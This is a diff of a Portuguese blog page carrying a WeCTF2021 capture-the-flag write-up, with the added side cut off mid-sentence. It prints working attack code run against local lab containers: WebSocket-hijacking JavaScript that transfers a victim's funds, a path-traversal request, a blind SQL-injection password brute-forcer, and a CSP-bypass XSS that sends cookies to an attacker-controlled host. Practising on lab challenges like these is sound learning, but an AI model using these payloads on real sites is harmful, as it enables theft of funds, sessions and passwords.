@@ -1,234 +1,83 @@
-<!doctype html><html lang=pt>
-<head>
-<title>WriteUp WeCTF2021 :: Blog do Dan</title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="Depois de aprender um pouco sobre pentesting, decidi aplicar meus conhecimentos no WeCTF2021. Disponível no Github, esse CTF pode ser rodado na sua máquina e feito localmente! Aqui está o que eu aprendi...">
-<meta name=keywords content>
-<meta name=robots content="noodp">
-<link rel=canonical href=https://dandeeccastro.github.io/posts/writeup-wectf-2021/>
-<link rel=stylesheet href=https://dandeeccastro.github.io/assets/style.css>
-<link rel=apple-touch-icon href=https://dandeeccastro.github.io/img/apple-touch-icon-192x192.png>
-<link rel="shortcut icon" href=https://dandeeccastro.github.io/img/favicon/orange.png>
-<meta name=twitter:card content="summary">
-<meta property="og:locale" content="pt">
-<meta property="og:type" content="article">
-<meta property="og:title" content="WriteUp WeCTF2021">
-<meta property="og:description" content="Depois de aprender um pouco sobre pentesting, decidi aplicar meus conhecimentos no WeCTF2021. Disponível no Github, esse CTF pode ser rodado na sua máquina e feito localmente! Aqui está o que eu aprendi...">
-<meta property="og:url" content="https://dandeeccastro.github.io/posts/writeup-wectf-2021/">
-<meta property="og:site_name" content="Blog do Dan">
-<meta property="og:image" content="https://dandeeccastro.github.io/blog/writeup-wectf-2021/wectf_banner.png">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-<meta property="article:published_time" content="2021-07-03 05:35:07 -0300 -0300">
-</head>
-<body class=orange>
-<div class=container>
-<header class=header>
-<div class=header__inner>
-<div class=header__logo>
-<a href=/>
-<div class=logo>
-Blog do Dan
-</div>
-</a>
-</div>
-<div class=menu-trigger>menu</div>
-</div>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/posts>Blog</a></li>
-<li><a href=/about>Sobre</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/posts>Blog</a></li>
-<li><a href=/about>Sobre</a></li>
-</ul>
-</nav>
-</header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>
-<a href=https://dandeeccastro.github.io/posts/writeup-wectf-2021/>WriteUp WeCTF2021</a></h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-03
-</span>
-<span class=post-author>:: Dan</span>
-</div>
-<img src=https://dandeeccastro.github.io/blog/writeup-wectf-2021/wectf_banner.png class=post-cover alt="WriteUp WeCTF2021" title="Cover Image">
-<div class=post-content><div>
-<p>Quando comecei a estudar segurança da computação, a imagem que vinha na minha cabeça era principalmente a parte de pentesting web. O motivo é simples: já tive dois anos de experiência trabalhando com desenvolvimento web em plataformas como Laravel e Angular, e nesse período eu cheguei a descobrir uma injeção de código em um dos produtos que estava desenvolvendo. Consequentemente consegui mais uma sprint, mas desde então fiquei muito interessado pela área.</p>
-<p>Agora em 2021, nas férias da faculdade, decidi me aplicar um pouco mais na área de segurança e escolhi um CTF para fazer. Um dos sites no qual você pode acessar CTFs antigos é o <a href=https://ctftime.org>CTFTime</a>, onde eu encontrei o WeCTF2021. Como os desafios estão <a href=https://github.com/wectf/2021>disponíveis no GitHub deles</a> em forma de containers Docker, é possível emular o ambiente do CTF original (com alguns cuidados, que falarei em breve) e botar a mão na massa.</p>
-<h1 id=instalação-e-configuração-do-ambiente>Instalação e Configuração do Ambiente<a href=#instalação-e-configuração-do-ambiente class=hanchor arialabel=Anchor>&#8983;</a> </h1>
-<p>Pra quem está lendo isso e quer fazer também, segue aqui o que você vai precisar para emular o ambiente da melhor forma possível.</p>
-<ul>
-<li>Os desafios estão disponíveis em containers Docker que podem ser gerados com o <em>Docker Compose</em>, então tenha certeza que ele está instalado!</li>
-<li>Alguns desafios envolvem vulnerabilidades que precisam de um &ldquo;ambiente de vítima&rdquo;. No código fonte do repositório, você vai encontrar uma pasta chamada <code>uv_worker</code>, na qual existem arquivos Python com o nome de desafios que são dessa categoria. Para eles você vai precisar de <em>Python</em> instalado, junto com <em>Selenium</em>, para que você possa emular o navegador da vítima</li>
-<li>Fora isso eu recomendo algumas utilidades como <em>Burp Suite</em>, mas mais por conveniência, porque as ferramentas de desenvolvedor do navegador já são um adianto muito grande</li>
-</ul>
-<p>Tendo isso instalado, basta clonar o repositório com <code>git clone https://github.com/wectf/2021</code>, abrir um terminal dentro da pasta clonada e criar os containers com <code>docker-compose up</code>. Não recomendo rodar os containers usando a flag -d, que joga os processos em background, porque alguns containers podem ter problemas para serem rodados, como aconteceu comigo. Sem a flag você pode ver quais containers deram problema e quais erros aconteceram.</p>
-<p>Outra recomendação: só tenha rodando os containers que você for usar para cada desafio (a não ser que o seu consiga rodar, porque o meu chegou no 100% de uso de CPU rapidinho)! Depois de tiver todos os containers criados, basta pará-los com <code>docker compose kill</code>, escolher qual quer você quer fazer com <code>docker container ls -a</code> e iniciá-lo com <code>docker start &lt;container_id></code></p>
-<h1 id=enfim-o-writeup>Enfim, o WriteUp<a href=#enfim-o-writeup class=hanchor arialabel=Anchor>&#8983;</a> </h1>
-<h2 id=coin>Coin<a href=#coin class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p><img src=/blog/writeup-wectf-2021/ethexchange.png alt="Tela Inicial do Desafio"></p>
-<p>Depois de iniciado o container, você terá acesso a um maravilhoso site de trading de Eth! Ao fazer login, verá que você é o único lá além de você é um colega com o nome TheBoss com 1M de dólares na conta.Objetivo: roubar o dinheiro e sair correndo!</p>
-<p>Analisando tanto a comunicação entre cliente e servidor quanto o código fonte do site, verá que, uma vez conectado, a comunicação com a exchange é feita via WebSocket. O protocolo funciona de uma forma relativamente simples: primeiro um handshake é feito entre cliente e servidor, e se o handshake for aceito, será feita a troca de protocolo e a conexão WebSocket é estabelecida.</p>
-<p><img src=/blog/writeup-wectf-2021/handshake.png alt="Handshake do WebSocket"></p>
-<p>Essa conexão WebSocket está suscetível a um ataque: se o handshake não usa qualquer tipo de token de sessão como um CSRF token, então qualquer site malicioso que for aberto por uma vítima pode fingir ser a vítima abrindo essa conexão. Esse é o Cross Site WebSocket Hijacking, ou CSWBH, e essa é a vulnerabilidade desse desafio.</p>
-<p>O código revela que existem cinco operações que podem ser feitas pela api da exchange: ping, que pega informações básicas do site para mostrar, init, que faz o login ou cadastro; buy, que compra Eth; sell, que vende Eth, e por fim transfer, que transfere Eth de um usuário para o outro. Tendo isso em mãos, basta montar um pequeno webserver em Python com o site malicioso que criará a conexão e fará as transferências para nossa conta! Sendo isso, fiz um site simples com uma tag script com o código abaixo.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>socket</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebSocket</span>(<span style=color:#e6db74>&#34;ws://localhost:4001&#34;</span>,<span style=color:#e6db74>&#34;ethexchange-api&#34;</span>);
-
-<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>transfer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
-	<span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;transfer&#34;</span>,
-	<span style=color:#e6db74>&#34;content&#34;</span><span style=color:#f92672>:</span> {
-		<span style=color:#e6db74>&#34;amount&#34;</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span>, <span style=color:#75715e>// quantidade humilde para teste
-</span><span style=color:#75715e></span>		<span style=color:#e6db74>&#34;to_token&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;meu_token&#34;</span> <span style=color:#75715e>// aqui entraria o token do meu user
-</span><span style=color:#75715e></span>	}
-});
-
-<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onopen</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
-	<span style=color:#75715e>// Vários para garantir
-</span><span style=color:#75715e></span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-}
-
-<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
-	<span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;http://localhost:8000/?response=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>);
-}
-</code></pre></div><p>O código fará várias tentativas de transfer de Eth para a minha conta e para cada resposta do servidor, enviará a mensagem para o localhost porta 8000 em forma de parâmetro de requisição e ela poderá ser vista na lista de requests do servidor Python aberto com <code>python -m http.server</code>. Com isso, conseguimos a resposta abaixo:</p>
-<p><img src=/blog/writeup-wectf-2021/exploit-parte-1.png alt="Primeira tentativa de exploit"></p>
-<p>Obtemos um JSON dizendo foram feitas três transferências de 0 Eth. Isso nos mostra que a vítima em questão não possui Eth na conta, somente dólares. Não seja por isso: podemos também fazer com que ele compre Eth antes de transferir! Basta adicionar compra de Eth no payload e a flag é nossa!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* Mantém a mesma coisa que antes, mas agora tem isso */</span>
-
-<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>buy</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
-	<span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;buy&#34;</span>,
-	<span style=color:#e6db74>&#34;content&#34;</span><span style=color:#f92672>:</span> {
-		<span style=color:#e6db74>&#34;amount&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;7000&#34;</span>,
-	}
-});
-
-<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onopen</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
-	<span style=color:#75715e>// Agora com buy antes 
-</span><span style=color:#75715e></span>	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>buy</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-	<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>transfer</span>);
-}
-
-<span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>event</span>) {
-	<span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;http://localhost:8000/?response=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>event</span>.<span style=color:#a6e22e>data</span>);
-}
-</code></pre></div><p><img src=/blog/writeup-wectf-2021/payload-parte-2.png alt="Transferência bem sucedida no Terminal"></p>
-<p>Agora as requisições mostram que dinheiro foi transferido para nossa conta, e se olharmos para nosso saldo&mldr;</p>
-<p><img src=/blog/writeup-wectf-2021/conta-com-dinheiro.png alt="Conta com Dinheiro"></p>
-<p>Tendo mais de 5 mil na sua conta, a flag será enviada para você na comunicação WebSocket depois de você enviar um ping.</p>
-<p><img src=/blog/writeup-wectf-2021/coin-flag.png alt="Flag do Desafio"></p>
-<h2 id=cache>Cache<a href=#cache class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>Nesse desafio, temos um site simples com duas páginas: <code>index</code> e <code>flag</code>. Na página <code>index</code>, recebemos um texto simples dizendo que não tem nada lá, mas para conferir o <code>flag</code>. Em <code>flag</code>, vemos que não podemos acessar a não ser que sejamos admin. Na pasta <code>uv_worker</code> vemos que existe um arquivo Python do desafio, então é outro desafio no qual temos que enviar links maliciosos para a vítima</p>
-<p><img src=/blog/writeup-wectf-2021/codigo-fonte-cache.png alt="Código Fonte do Desafio"></p>
-<p>Dando uma olhada no código fonte da middleware que faz a autenticação que bloqueia a gente, vemos uma implementação de caching curiosa: se a página a ser acessada tiver sufixo de JS, HTML ou CSS, ela será cacheada e disponível para acesso mais rapidamente que as outras.</p>
-<p>Isso é feito para que arquivos estáticos, os que todo usuário precisa ter acesso, estejam disponíveis rapidamente. Mas esse cache foi implementado de uma forma insegura, que permite um ataque de <em>cache deception</em>: a manipulação do sistema de cache de forma a cachear informações confidenciais, como por exemplo uma página de admin&mldr;</p>
-<p>Para isso, basta gerar um link no site alvo cujo sufixo passe pelo filtro de cache, mas o prefixo contenha a palavra <code>flag</code>, e mandar para que o administrador acesse. Isso fará com que o arquivo seja disponibilizado para todos por causa do cache, mas o roteamento do site vai gerar a página com a informação confidencial. Ela estará disponível por 10s: tempo o suficiente para acessarmos a página e obter a flag!</p>
-<h2 id=include>Include<a href=#include class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>Nesse desafio temos uma página, que, quando aberta, reclama que não definimos um arquivo para ser apresentado. O código PHP no começo da página mostra que o arquivo tem que ser passado como parâmetro do GET, e também usando um emoji. O desafio também mostra que a flag está no arquivo <code>flag.txt</code>. Sendo assim, basta acessar a página com o parâmetro a seguir e a flag é nossa!</p>
-<p>/?exploding_head=/flag.txt</p>
-<h2 id=phish>Phish<a href=#phish class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>Esse desafio é interessante: a vítima dos desafios, Shou, caiu num site de phishing que não é nosso! Mas o site de phishing em si é vulnerável à SQLi, e sabendo disso, nosso objetivo é extrair a senha dele (a flag) desse site. Para esse caso, o código fonte nos mostra algo interessante: se a query para o banco de dados tiver algum tipo de erro, esse erro será retornado na tela, caso contrário, a query passa e ele redirecionará para a página que mostra que você teve sua senha roubada.</p>
-<p><img src=/blog/writeup-wectf-2021/source_code_phish.png alt="Código Fonte do Desafio"></p>
-<p>O site não possui nenhum tipo de reflexão de dados na tela, então algum tipo de SQLi que retorne a senha na tela é inviável. No entanto, podemos fazer diferente: como somente erros aparecem na tela, podemos fazer bruteforce da senha injetando uma query que insira uma senha no BD <em>se e somente se</em> nosso palpite for uma parte da senha do Shou. Para fazer isso, escrevi o pequeno script abaixo, cujo payload do SQLi e detalhes eu vou descrever melhor abaixo.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#f92672>from</span> requests <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
-
-<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
-    host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1:4008&#34;</span>
-    s <span style=color:#f92672>=</span> session()
-
-    passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;we{&#34;</span>
-    name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nomedeusuario&#34;</span>
-
-    char <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;+&#39;</span>
-    <span style=color:#66d9ef>while</span> <span style=color:#e6db74>&#39;}&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> passwd:
-
-        <span style=color:#66d9ef>if</span> char <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;?&#39;</span>:
-            char <span style=color:#f92672>=</span> chr(ord(char) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
-
-        passwd_iteration <span style=color:#f92672>=</span> passwd <span style=color:#f92672>+</span> char
-        sqli <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;qqrcoisa&#39;,( SELECT password FROM user WHERE username=&#39;shou&#39; AND password GLOB &#39;</span><span style=color:#e6db74>{</span>passwd_iteration<span style=color:#e6db74>}</span><span style=color:#e6db74>*&#39; ));--&#34;</span>
-
-        form_data <span style=color:#f92672>=</span> {
-            <span style=color:#e6db74>&#34;username&#34;</span>: name,
-            <span style=color:#e6db74>&#34;password&#34;</span>: sqli
-        }
-        result <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://</span><span style=color:#e6db74>{</span>host<span style=color:#e6db74>}</span><span style=color:#e6db74>/add&#34;</span>,data<span style=color:#f92672>=</span>form_data)
-
-        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Your password is leaked&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content <span style=color:#f92672>or</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;UNIQUE constraint failed&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content:
-            passwd <span style=color:#f92672>+=</span> char
-            char <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;+&#39;</span>
-            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&gt; HIT: </span><span style=color:#e6db74>{</span>passwd<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-
-        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;NOT NULL constraint failed&#34;</span> <span style=color:#f92672>in</span> result<span style=color:#f92672>.</span>content:
-            <span style=color:#75715e># print(f&#34;&gt; NOT HIT: {passwd + char}&#34;)</span>
-            char <span style=color:#f92672>=</span> chr(ord(char) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
-</code></pre></div><ul>
-<li>O banco de dados utiliza SQLite</li>
-<li>A ordem do <code>INSERT</code> no código fonte é <code>(password,username)</code>, então a injeção de SQL é no <code>password</code>, para que eu possa injetar propriamente a subquery em questão</li>
-<li>A operação <code>GLOB</code> é usada porque, ao invés do <code>LIKE</code>, ele é case-sensitive.</li>
-<li>O <code>UNIQUE constraint failed</code> passa como válido para a comparação de senha porque o erro vem de estarmos inserindo o mesmo usuário várias vezes, logo não implica que a comparação deu errado, então esse erro é um falso negativo</li>
-</ul>
-<p>Com esse exploit, a senha será construida lentamente através das &ldquo;confirmações&rdquo; do banco de dados do site!</p>
-<p><img src=/blog/writeup-wectf-2021/exploit_phishing.gif alt="Exploit sendo executado"></p>
-<h2 id=csp-1>CSP 1<a href=#csp-1 class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>Esse foi o desafio dos quais eu mais lutei contra, por um motivo mais relacionado com o ambiente de teste do que o desafio em si, mas já já falo sobre isso. Ao iniciá-lo, você verá um site no qual você pode escrever num formulário um pequeno website, que pode ser acessado depois por um link gerado na hora. A princípio você pode pensar &ldquo;ah, vou escrever uma tag script, rodar meu JS, pegar a flag e sair correndo&rdquo;. Boa ideia, mas ela não vai funcionar, por um simples motivo: CSP, ou Content Security Policy.</p>
-<p>Content-Security-Policy é um cabeçalho de requisição enviado pelo servidor, que define o que pode e não pode ser executado ao acessar uma página. Quando enviamos o nosso projeto de website, ele nos retorna o site do jeito que fizemos, mas bloqueando conteúdos perigosos por meio dessa medida de segurança.</p>
-<p>Se fizermos um simples site com uma tag img, veremos que a página criada remove o arquivo desejado e deixa somente o domínio, para que imagens possam ser pegas nele. Então se enviamos uma url com <code>https://evil.com/imagem.jpg</code> o CSP terá configurado com <code>https://evil.com</code> somente</p>
-<p>Isso mostra que o que é passado pro atributo src é colocado no CSP pelo servidor. Sendo assim, isso abre uma possibilidade para alterar o que tem no CSP, permitindo que façamos um site com XSS para enviar ao administrador e pegar a flag!</p>
-<p>Lendo mais sobre o CSP, é possível ver que o atributo <code>script-src</code> define se scripts podem ser rodados no site em questão. No site alvo, ele está desabilitado, mas ao injetarmos nosso próprio <code>script-src</code> com o valor <code>unsafe-inline</code>, podemos agora fazer tags script e executar código.</p>
-<p>A partir daqui, bastaria fazer um fetch com os dados do cookie para um domínio ou servidor que controlamos e sucesso, certo? Errado, por um simples motívo: fetch está bloqueado pelo CSP, e como está antes da nossa injeção, não podemos sobrescrevê-lo. Mas não seja por isso: basta, ao injetar o CSP, autorizar um domínio nosso e, por meio de outra imagem, exfiltrar os dados. Isso pode ser feito da seguinte forma:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>setTimeout</span>(<span style=color:#66d9ef>function</span>(){
-	<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>imgNova</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;img&#34;</span>);
-	<span style=color:#a6e22e>imgNova</span>.<span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://meu.pc:8001/?cookie=&#34;</span> <span style=color:#f92672>+</span> document.<span style=color:#a6e22e>cookie</span>;
-},<span style=color:#ae81ff>2000</span>);
-</code></pre></div><p>Note que a url em questão é meu.pc. Isso se dá porque tem um pequeno problema de fazer esse desafio usando localhost: como tanto a máquina do atacante como a máquina da vítima estão no mesmo domínio de rede, o cookie de autenticação será enviado mesmo se você não exfiltrar ele, porque ele é considerado como Same Origin. Para fazer com que o desafio ficasse mais parecido com o real, eu adicionei no <code>/etc/hosts</code> uma linha que define outro nome para localhost: <code>meu.pc</code>. Dessa forma, eu não tomo um <em>spoiler</em> do desafio!</p>
-<p>E passando esse link para o computador da vítima (no mesmo jeito com a pasta <code>uv_worker</code> que os outros desafios), quando ela acessar, uma requisição será enviada para localhost:8001. Para ver o que é mandado lá, basta &ldquo;ouvir&rdquo; usando netcat (<code>ncat -lk localhost 8001</code>) e o cookie chegará da seguinte forma:</p>
-<p><img src=/blog/writeup-wectf-2021/flag_csp.png alt="Output do netcat depois do exploit"></p>
-<h1 id=considerações-finais>Considerações Finais<a href=#considerações-finais class=hanchor arialabel=Anchor>&#8983;</a> </h1>
-<p>Eu parei meu write up aqui por alguns motivos simples:</p>
-<ul>
-<li>Alguns containers não funcionam ainda no ambiente local, e não consegui descobrir o porque ainda</li>
-<li>Minhas férias acabaram, infelizmente</li>
-<li>Estou trabalhando em outros projetos relacionados à segurança (segredo)</li>
-</ul>
-<p>Pretendo atualizar esse post com as próximas soluções que conseguir assim que tiver conseguido atacar o desafio, mas por enquanto fico por aqui. Obrigado por ter lido até aqui!</p>
-</div></div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Leia outros posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://dandeeccastro.github.io/posts/internet-e-o-novo-parquinho/>
-<span class=button__icon>←</span>
-<span class=button__text>A internet é o novo parquinho</span>
-</a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class=copyright>
-<span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
-</div>
-</div>
-</footer>
-<script src=https://dandeeccastro.github.io/assets/main.js></script>
-<script src=https://dandeeccastro.github.io/assets/prism.js></script>
-</div>
-</body>
-</html>
+<!doctype html><html lang=pt><head><title>WriteUp WeCTF2021 :: Blog do Dan</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Depois de aprender um pouco sobre pentesting, decidi aplicar meus conhecimentos no WeCTF2021. Disponível no Github, esse CTF pode ser rodado na sua máquina e feito localmente! Aqui está o que eu aprendi..."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://dandeeccastro.github.io/blog/posts/writeup-wectf-2021/><link rel=stylesheet href=https://dandeeccastro.github.io/blog/assets/style.css><link rel=apple-touch-icon href=https://dandeeccastro.github.io/blog/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://dandeeccastro.github.io/blog/img/favicon/orange.png><meta name=twitter:card content="summary"><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="og:title" content="WriteUp WeCTF2021"><meta property="og:description" content="Depois de aprender um pouco sobre pentesting, decidi aplicar meus conhecimentos no WeCTF2021. Disponível no Github, esse CTF pode ser rodado na sua máquina e feito localmente! Aqui está o que eu aprendi..."><meta property="og:url" content="https://dandeeccastro.github.io/blog/posts/writeup-wectf-2021/"><meta property="og:site_name" content="Blog do Dan"><meta property="og:image" content="https://dandeeccastro.github.io/blog/writeup-wectf-2021/wectf_banner.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-07-03 05:35:07 -0300 -0300"></head><body class=orange><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Blog do Dan</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/blog/posts>Blog</a></li><li><a href=/blog/about>Sobre</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/blog/posts>Blog</a></li><li><a href=/blog/about>Sobre</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://dandeeccastro.github.io/blog/posts/writeup-wectf-2021/>WriteUp WeCTF2021</a></h1><div class=post-meta><span class=post-date>2021-07-03</span>
+<span class=post-author>:: Dan</span></div><img src=https://dandeeccastro.github.io/blog/writeup-wectf-2021/wectf_banner.png class=post-cover alt="WriteUp WeCTF2021" title="Cover Image"><div class=post-content><div><p>Quando comecei a estudar segurança da computação, a imagem que vinha na minha cabeça era principalmente a parte de pentesting web. O motivo é simples: já tive dois anos de experiência trabalhando com desenvolvimento web em plataformas como Laravel e Angular, e nesse período eu cheguei a descobrir uma injeção de código em um dos produtos que estava desenvolvendo. Consequentemente consegui mais uma sprint, mas desde então fiquei muito interessado pela área.</p><p>Agora em 2021, nas férias da faculdade, decidi me aplicar um pouco mais na área de segurança e escolhi um CTF para fazer. Um dos sites no qual você pode acessar CTFs antigos é o <a href=https://ctftime.org>CTFTime</a>, onde eu encontrei o WeCTF2021. Como os desafios estão <a href=https://github.com/wectf/2021>disponíveis no GitHub deles</a> em forma de containers Docker, é possível emular o ambiente do CTF original (com alguns cuidados, que falarei em breve) e botar a mão na massa.</p><h1 id=instalação-e-configuração-do-ambiente>Instalação e Configuração do Ambiente<a href=#instalação-e-configuração-do-ambiente class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Pra quem está lendo isso e quer fazer também, segue aqui o que você vai precisar para emular o ambiente da melhor forma possível.</p><ul><li>Os desafios estão disponíveis em containers Docker que podem ser gerados com o <em>Docker Compose</em>, então tenha certeza que ele está instalado!</li><li>Alguns desafios envolvem vulnerabilidades que precisam de um &ldquo;ambiente de vítima&rdquo;. No código fonte do repositório, você vai encontrar uma pasta chamada <code>uv_worker</code>, na qual existem arquivos Python com o nome de desafios que são dessa categoria. Para eles você vai precisar de <em>Python</em> instalado, junto com <em>Selenium</em>, para que você possa emular o navegador da vítima</li><li>Fora isso eu recomendo algumas utilidades como <em>Burp Suite</em>, mas mais por conveniência, porque as ferramentas de desenvolvedor do navegador já são um adianto muito grande</li></ul><p>Tendo isso instalado, basta clonar o repositório com <code>git clone https://github.com/wectf/2021</code>, abrir um terminal dentro da pasta clonada e criar os containers com <code>docker-compose up</code>. Não recomendo rodar os containers usando a flag -d, que joga os processos em background, porque alguns containers podem ter problemas para serem rodados, como aconteceu comigo. Sem a flag você pode ver quais containers deram problema e quais erros aconteceram.</p><p>Outra recomendação: só tenha rodando os containers que você for usar para cada desafio (a não ser que o seu consiga rodar, porque o meu chegou no 100% de uso de CPU rapidinho)! Depois de tiver todos os containers criados, basta pará-los com <code>docker compose kill</code>, escolher qual quer você quer fazer com <code>docker container ls -a</code> e iniciá-lo com <code>docker start &lt;container_id></code></p><h1 id=enfim-o-writeup>Enfim, o WriteUp<a href=#enfim-o-writeup class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=coin>Coin<a href=#coin class=hanchor arialabel=Anchor>&#8983;</a></h2><p><img src=/blog/writeup-wectf-2021/ethexchange.png alt="Tela Inicial do Desafio"></p><p>Depois de iniciado o container, você terá acesso a um maravilhoso site de trading de Eth! Ao fazer login, verá que você é o único lá além de você é um colega com o nome TheBoss com 1M de dólares na conta.Objetivo: roubar o dinheiro e sair correndo!</p><p>Analisando tanto a comunicação entre cliente e servidor quanto o código fonte do site, verá que, uma vez conectado, a comunicação com a exchange é feita via WebSocket. O protocolo funciona de uma forma relativamente simples: primeiro um handshake é feito entre cliente e servidor, e se o handshake for aceito, será feita a troca de protocolo e a conexão WebSocket é estabelecida.</p><p><img src=/blog/writeup-wectf-2021/handshake.png alt="Handshake do WebSocket"></p><p>Essa conexão WebSocket está suscetível a um ataque: se o handshake não usa qualquer tipo de token de sessão como um CSRF token, então qualquer site malicioso que for aberto por uma vítima pode fingir ser a vítima abrindo essa conexão. Esse é o Cross Site WebSocket Hijacking, ou CSWBH, e essa é a vulnerabilidade desse desafio.</p><p>O código revela que existem cinco operações que podem ser feitas pela api da exchange: ping, que pega informações básicas do site para mostrar, init, que faz o login ou cadastro; buy, que compra 